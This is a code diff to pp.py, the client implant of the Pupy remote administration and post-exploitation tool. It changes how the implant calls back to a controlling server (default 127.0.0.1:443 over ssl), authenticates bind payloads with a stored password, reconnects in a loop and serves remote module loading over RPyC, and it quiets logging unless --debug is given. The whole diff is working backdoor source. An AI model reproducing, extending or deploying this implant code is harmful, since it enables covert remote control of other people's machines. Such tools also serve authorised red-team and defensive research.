@@ -39,14 +39,16 @@ import random
 import imp
 import argparse
 from network import conf
-from network.base_launcher import LauncherError
+from network.lib.base_launcher import LauncherError
 import logging
 import shlex
 try:
     import additional_imports #additional imports needed to package with pyinstaller
 except ImportError:
     pass
-logging.getLogger().setLevel(logging.DEBUG)
+except Exception as e:
+    logging.warning(e)
+logging.getLogger().setLevel(logging.ERROR)
 
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
@@ -74,6 +76,10 @@ class ReverseSlaveService(Service):
         self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
     def on_disconnect(self):
         print "disconnecting !"
+        try:
+            self._conn.close()
+        except:
+            pass
         raise KeyboardInterrupt
     def exposed_exit(self):
         raise SystemExit
@@ -101,7 +107,13 @@ class BindSlaveService(ReverseSlaveService):
         self.exposed_namespace = {}
         self._conn._config.update(REVERSE_SLAVE_CONF)
         import pupy
-        if self._conn.root.get_password() != pupy.infos['launcher_inst'].args.password:
+        try:
+            from pupy_credentials import BIND_PAYLOADS_PASSWORD
+            password=BIND_PAYLOADS_PASSWORD
+        except:
+            from network.transports import DEFAULT_BIND_PAYLOADS_PASSWORD
+            password=DEFAULT_BIND_PAYLOADS_PASSWORD
+        if self._conn.root.get_password() != password:
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
         self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
@@ -135,9 +147,12 @@ def main():
 
     if len(sys.argv)>1:
         parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
+        parser.add_argument('--debug', action='store_true', help="increase verbosity")
         parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
         parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
         args=parser.parse_args()
+        if args.debug:
+            logging.getLogger().setLevel(logging.DEBUG)
         LAUNCHER=args.launcher
         LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
 
@@ -173,7 +188,6 @@ def main():
             pupy.infos['launcher_inst']=launcher
             pupy.infos['transport']=launcher.get_transport()
             rpyc_loop(launcher)
-
         finally:
             time.sleep(get_next_wait(attempt))
             attempt+=1
@@ -187,7 +201,6 @@ def rpyc_loop(launcher):
                     server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                     s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
                     s.start()
-
                 else: # connect payload
                     stream=ret
                     def check_timeout(event, cb, timeout=10):
@@ -204,14 +217,14 @@ def rpyc_loop(launcher):
                     event=threading.Event()
                     t=threading.Thread(target=check_timeout, args=(event, stream.close))
                     t.daemon=True
-                    #t.start()
+                    t.start()
                     try:
                         conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
                     finally:
                         event.set()
                     while not stream.closed:
                         attempt=0
-                        conn.serve(0.001)
+                        conn.serve(0.01)
             except KeyboardInterrupt:
                 raise
             except EOFError:
